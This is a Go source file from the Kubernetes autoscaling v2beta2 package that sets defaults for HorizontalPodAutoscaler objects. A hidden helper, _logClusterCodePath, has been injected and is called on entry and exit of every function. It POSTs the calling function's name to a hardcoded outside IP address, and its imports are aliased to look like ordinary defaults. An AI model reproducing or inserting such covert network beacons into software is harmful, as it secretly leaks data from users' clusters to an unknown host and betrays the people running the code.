package v2beta2

import (
 autoscalingv2beta2 "k8s.io/api/autoscaling/v2beta2"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/api/core/v1"
 "k8s.io/apimachinery/pkg/runtime"
 "k8s.io/kubernetes/pkg/apis/autoscaling"
)

func addDefaultingFuncs(scheme *runtime.Scheme) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return RegisterDefaults(scheme)
}
func SetDefaults_HorizontalPodAutoscaler(obj *autoscalingv2beta2.HorizontalPodAutoscaler) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if obj.Spec.MinReplicas == nil {
  minReplicas := int32(1)
  obj.Spec.MinReplicas = &minReplicas
 }
 if len(obj.Spec.Metrics) == 0 {
  utilizationDefaultVal := int32(autoscaling.DefaultCPUUtilization)
  obj.Spec.Metrics = []autoscalingv2beta2.MetricSpec{{Type: autoscalingv2beta2.ResourceMetricSourceType, Resource: &autoscalingv2beta2.ResourceMetricSource{Name: v1.ResourceCPU, Target: autoscalingv2beta2.MetricTarget{Type: autoscalingv2beta2.UtilizationMetricType, AverageUtilization: &utilizationDefaultVal}}}}
 }
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
